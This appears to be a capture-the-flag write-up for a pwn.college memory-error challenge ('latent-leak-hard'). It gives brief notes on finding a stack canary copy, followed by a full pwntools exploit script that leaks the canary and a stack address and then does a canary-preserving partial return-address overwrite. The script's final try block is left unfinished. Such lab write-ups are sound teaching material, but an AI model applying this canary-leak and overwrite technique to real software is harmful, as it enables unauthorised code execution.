![](img/Latent%20Leak%20Hard-1780487828388.webp)

the output stop before the canary, which, again, mean that we cant leak the canary

![](img/Latent%20Leak%20Hard-1780491015116.webp)

inspecting the stack, in which our input start at 0x7fffffffc770 (bc my input is 2 As), we find that the canary actually has a copy before $rbp-8, which is likely because of other functions

and after inspecting the return address, the win authed address, all left to do is partial overwrite

```
#!/usr/bin/python3
from pwn import *
import re
import sys
import time

context.log_level="debug"

while True:
    p=process("/home/thtad/Desktop/pwncollege/mem_error/latent-leak/latent-leak-hard")

    payload=b"REPEAT"+b"A"*(131)

    p.recvuntil("Payload size:")

    p.sendline(str(len(payload)).encode())
    p.recvuntil("bytes)!")
    p.send(payload)

    zz = p.recvuntil(b"Backdoor")
    dat=zz.split(b"You said: ",1)[1]
    dat=dat[len(payload):]
    canary=b"\x00"+dat[:7]
    print(canary)

    payload=b"REPEAT"+b"A"*(148)

    p.recvuntil("Payload size:")
    p.sendline(str(154).encode())
    p.recvuntil("bytes)!")
    p.send(payload)

    zz = p.recvuntil(b"Backdoor")
    dat=zz.split(b"You said: ",1)[1]
    dat=dat[len(payload):]
    dat=dat[:6]
    print(dat)
    addr=b"\xd9\x60" + dat[:4] + b"\x00\x00"
    print(addr)

    payload=b"A"*(408) + canary + addr + b"\xd1\x5d"
    print(payload)

    p.recvuntil("Payload size:")
    p.sendline(str(len(payload)).encode())
    p.recvuntil("bytes)!")

    p.send(payload) 

    try:
        p.recvuntil(b'flag', timeout=1.5)
        break
    except:
        pass
    try:
        p.close()

```